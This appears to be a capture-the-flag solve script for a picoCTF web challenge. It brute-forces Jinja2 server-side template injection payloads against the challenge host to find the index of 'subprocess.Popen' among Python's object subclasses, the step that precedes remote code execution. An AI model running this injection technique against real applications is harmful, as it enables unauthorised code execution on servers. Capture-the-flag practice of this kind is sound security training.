import requests
from concurrent.futures import ThreadPoolExecutor

burp0_url = "http://rescued-float.picoctf.net:56694/announce"
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "http://rescued-float.picoctf.net:50097/",
    "Origin": "http://rescued-float.picoctf.net:50097",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i"
}

input_value = "subprocess.Popen" 

proxy = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

def make_request(i):
    burp0_data = {"content": "{{().__class__.__bases__[0].__subclasses__()[" + str(i) + "]}}"}
    
    response = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=proxy, verify=False)
    
    if input_value in response.text:
        print(f"Match found in Request {i}: {burp0_data}")
        print(f"Response: {response.text}")

# multi threading
num_threads = 10

with ThreadPoolExecutor(max_workers=num_threads) as executor:
    executor.map(make_request, range(1, 500))